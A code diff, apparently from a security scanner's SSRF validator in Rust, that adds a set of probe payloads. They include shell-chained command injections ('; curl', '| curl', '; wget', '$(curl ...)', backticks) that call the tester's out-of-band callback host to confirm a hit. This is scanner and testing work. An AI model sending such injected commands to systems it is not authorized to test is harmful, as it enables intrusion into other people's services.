@@ -30,17 +30,40 @@ impl Validator for SsrfValidator {
 
         let token = format!("ssrf{}", &uuid::Uuid::new_v4().simple().to_string()[..12]);
         let cb = format!("{}/{}/cb", self.oob_base, token);
-        // If evidence declares a param, inject there; if the evidence URL
-        // itself is the fetch-target, replay the whole request shape.
+        // Try every injection shape: bare URL for direct-fetch sinks,
+        // command-chained forms for sinks gated behind shell metachars
+        // (e.g. `; curl {cb}`), and template forms.
+        let shapes = [
+            cb.clone(),
+            format!("; curl {cb}"),
+            format!("| curl {cb}"),
+            format!("; wget -qO- {cb}"),
+            format!("$(curl {cb})"),
+            format!("`curl {cb}`"),
+        ];
         let mut ev = f.evidence.clone();
-        let res = if ev["param"].as_str().is_some() {
-            send_value(&self.probe, &ev, &cb).await
+        let mut last_err = None;
+        if ev["param"].as_str().is_some() {
+            for shape in &shapes {
+                match send_value(&self.probe, &ev, shape).await {
+                    Err(e) => last_err = Some(e.to_string()),
+                    Ok(_) => {}
+                }
+                // Early exit: a hit may already have landed.
+                if !self.oob.hits_for(&token).is_empty() {
+                    break;
+                }
+            }
         } else {
             ev["url"] = serde_json::json!(cb);
-            send_value(&self.probe, &ev, "1").await
-        };
-        if let Err(e) = res {
-            return Verdict::Rejected { reason: format!("trigger failed: {e}") };
+            if let Err(e) = send_value(&self.probe, &ev, "1").await {
+                last_err = Some(e.to_string());
+            }
+        }
+        if self.oob.hits_for(&token).is_empty() {
+            if let Some(e) = last_err {
+                tracing::debug!(err = %e, "ssrf trigger attempt errored");
+            }
         }
 
         for _ in 0..10 {
